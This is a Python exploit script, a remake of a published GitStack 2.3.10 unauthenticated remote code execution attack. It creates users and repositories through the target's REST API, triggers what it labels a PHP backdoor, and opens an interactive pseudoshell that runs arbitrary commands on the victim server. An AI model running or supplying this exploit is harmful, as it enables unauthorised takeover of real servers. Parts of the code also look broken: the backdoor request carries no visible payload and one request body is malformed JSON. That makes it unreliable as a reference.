#!/usr/bin/python3

'''
Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
Date: 18.01.2018
Software Link: https://gitstack.com/

Exploit Original Author: Kacper Szurek
Contact: https://twitter.com/KacperSzurek
Website: https://security.szurek.pl/

***This is a remake, upgrading and migration**

This remake migrates from python2 to python3.
And also it adds: user input,
a fancy banner, and a pseudoshell.

Author: Technopy
Contact: https://twitter.com/technopy
Website: https://technopy311.github.io/

Category: remote


Original Author's Documentation:
https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html


'''


from os import lchown, system
import requests
from requests.auth import HTTPBasicAuth, extract_cookies_to_jar
import sys

ip = ''

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

def banner():
    print("   _____ _ _    _____ _             _      _____   _____ ______ _ ")
    print("  / ____(_) |  / ____| |           | |    |  __ \ / ____|  ____| |")
    print(" | |  __ _| |_| (___ | |_ __ _  ___| | __ | |__) | |    | |__  | |")
    print(" | | |_ | | __|\___ \| __/ _` |/ __| |/ / |  _  /| |    |  __| | |")
    print(" | |__| | | |_ ____) | || (_| | (__|   <  | | \ \| |____| |____|_|")
    print("  \_____|_|\__|_____/ \__\__,_|\___|_|\_\ |_|  \_\\_____|______(_)")


def exploit():
    ip = ''

    repository = 'rce'
    username = 'rce'
    password = 'rce'
    csrf_token = 'token'

    print("Enter the target's ip address and port")
    print("EG: 127.0.0.1:80")
    ip = input(": ")


    print("[+] Listing users")


    try:
        r = requests.get("http://" + ip + "/rest/user/")
        user_list = r.json()
        user_list.remove('everyone')
    except:
        pass


    if len(user_list) > 0:
        username = user_list[0]
        print ("[+] Found user" + str(username))
    else:
        r = requests.post("http://" + ip + "/rest/user/", data={'username' : username})
        print("[+] No user found")
        print("[+] Creating a user")

        if not "User created" in r.text and not "User already exist" in r.text:
            print("[-] Could not create a user")
            exit()


    print("[+] Testing web repository")


    r = requests.get("http://" + ip + "/rest/settings/general/webinterface/")
    if "true" in r.text:
        print("[+] Web repository already enabled")
    else:
        print("[+] Enabling web repository")
        r = requests.put("http://" + ip + "/rest/settings/general/webinterface/", data='{"enabled: "true"}')
        if not "Web interface successfully enabled" in r.text:
            print("[Could not enable web interface]")
            exit()


    print("[+] Listing repositories")


    r = requests.get("http://" + ip + "/rest/repository")
    repository_list = r.json()

    if len(repository_list) > 0:
        repository = repository_list[0]['name']
        print("[+] Found repository " + str(repository))
    else:
        print("[+] Creating a repository")

        r = requests.post("http://" + ip + "/rest/repository", cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
        if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
            print("[-] Cannot create repository")
            exit()


    print("[+] Add user to repository")
    

    r = requests.post("http://" + ip + "/rest/repository/" + str(repository) + "/user/" + str(username) + "/")
    print(r.text    )

    if not "added to" in r.text and not "has already" in r.text:
        print("[-] Cannot add user to repository")
        exit()


    print("[+] Disabling access for anyone")


    r = requests.delete("http://" + ip + "/rest/repository/" + str(repository) + "/user/everyone/")

    if not "everyone removed from rce" in r.text and not "not in list" in r.text:
        print("[-] Cannot remove access from anyone")
        exit()
    
    print("[+] Creating backdoor in PHP")
    r = requests.get("http://" + ip + "/web/index.php?p=" + str(repository) + ".git&a=summary")
    print (r.text.encode(sys.stdout.encoding, errors='replace'))

    print("[+] Executing test command (whoami)")
    r = requests.post("http://" + ip + "/web/exploit.php", data={'a' : 'whoami'})
    print (r.text.encode(sys.stdout.encoding, errors='replace'))

    print("[+] Starting the pseudoshell")
    print("Do CTRL + C to exit.\n")


    while True:
        print("[$] PseudoShell [$]")
        command = input("Enter the command to execute:")
        print("\n")

        if str.lower(command) == "help":
            print("Available Commands:")
            print("help: Prints this.")
            print("custom: Let's you execute arbitrary set payload.")

        elif str.lower(command) == "custom":
            cmd = input("Write your payload\n:")
            print("[+] Exec...")
            r = requests.post("http://" + ip + "/web/exploit.php", data={'a' : cmd})
            print (r.text.encode(sys.stdout.encoding, errors='replace'))

        elif command == '':
            continue
        else:
            print("Command not found, try use the help command. \n")




if __name__ == '__main__':
    try:
        banner()
        exploit()
    except KeyboardInterrupt:
        print("\n Bye! ;P  ... meow")
        exit()
                                                                  
                                                                  